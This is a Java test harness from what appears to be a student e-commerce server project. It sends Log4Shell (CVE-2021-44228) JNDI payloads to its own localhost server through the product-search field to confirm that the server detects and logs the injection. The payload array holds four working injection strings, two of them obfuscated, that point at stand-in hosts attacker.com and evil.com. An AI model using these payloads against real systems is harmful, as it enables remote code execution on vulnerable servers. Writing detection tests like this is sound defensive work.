package com.chrionline.server.attack;

import com.chrionline.shared.dto.Request;
import com.chrionline.shared.dto.Response;
import com.chrionline.shared.enums.Action;
import java.io.BufferedReader;
import java.io.InputStreamReader;
import java.io.PrintWriter;
import java.net.Socket;
import java.util.HashMap;
import java.util.Map;

public class Log4jAttacker {

    public static void main(String[] args) throws Exception {
        String host = "localhost";
        int port = 9090;

        System.out.println("[ATTACK] Log4j (CVE-2021-44228) exploitation test...\n");

        // Payloads classiques Log4Shell
        String[] payloads = {
                "${jndi:ldap://attacker.com/evil}",
                "${jndi:rmi://attacker.com:1099/Exploit}",
                "${${::-j}ndi:ldap://attacker.com/a}",    // Obfusqué
                "${j${::-n}di:${::-l}dap://evil.com/x}"  // Très obfusqué
        };

        try (Socket socket = new Socket(host, port);
             PrintWriter out = new PrintWriter(socket.getOutputStream(), true);
             BufferedReader in = new BufferedReader(new InputStreamReader(socket.getInputStream()))) {

            for (int i = 0; i < payloads.length; i++) {
                System.out.println("[ATTACK] Test payload #" + (i+1) + " :");
                System.out.println("  " + payloads[i]);

                // Tenter d'injecter dans recherche produit
                Map<String, Object> data = new HashMap<>();
                data.put("keyword", payloads[i]);

                Request req = new Request(Action.SEARCH_PRODUCTS, null, data);
                out.println(req.toJson());

                String response = in.readLine();
                Response resp = Response.fromJson(response);

                System.out.println("  Réponse : " + resp.getMessage());
                System.out.println();

                Thread.sleep(500);
            }
        }

        System.out.println("[ATTACK] Test terminé. Vérifiez les logs serveur pour '[LOG4J] JNDI injection détectée'");
    }
}